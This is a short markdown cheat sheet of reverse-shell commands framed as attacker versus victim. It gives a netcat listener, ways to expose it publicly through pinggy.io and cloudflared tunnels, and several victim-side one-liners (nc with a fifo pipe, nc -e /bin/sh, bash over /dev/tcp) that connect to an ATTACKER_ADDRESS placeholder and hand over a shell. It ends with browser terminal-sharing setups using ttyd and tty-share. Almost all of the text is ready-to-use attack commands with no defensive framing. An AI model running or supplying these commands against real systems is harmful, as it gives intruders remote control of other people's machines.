# Terminal Reverse Shell

## Open Listener Port on Attacker Machine
* `nc -v -lp 3000`
* macOS `nc -v -l 3000`

### Optional: Get Public Address via TCP Reverse Tunnel

- pinggy.io 
  - https `ssh     free.pinggy.io -p 443 -R0:localhost:<local-port> `
  - tcp   `ssh tcp@free.pinggy.io -p 443 -R0:localhost:<local-port> `

- cloudflare `cloudflared tunnel --url tcp://localhost:3000`

## Reverse Connect from Victim Machine to Attacker Machine
### bash

* nc
  * with fifo back pipe
    `BACKPIPE=/tmp/backpipe; rm -f $BACKPIPE; mkfifo $BACKPIPE; nc $ATTACKER_ADDRESS $ATTACKER_PORT 0<$BACKPIPE | /bin/sh >$BACKPIPE 2>&1`
  * with `-e` option
    `nc ATTACKER_ADDRESS:ATTACKER_PORT –e /bin/sh`
* bash
  `/bin/bash -c '/bin/bash -i >& /dev/tcp/${0/://} 0>&1' localhost:8000`

# Browser Reverse Shell - ttyd
`docker run --rm -p 8080:7681 tsl0922/ttyd`
`ssh -R 80:localhost:8080 nokey@localhost.run`

# Browser Reverse Shell - tty-share
`docker run --rm -it elisescu/tty-share --public`
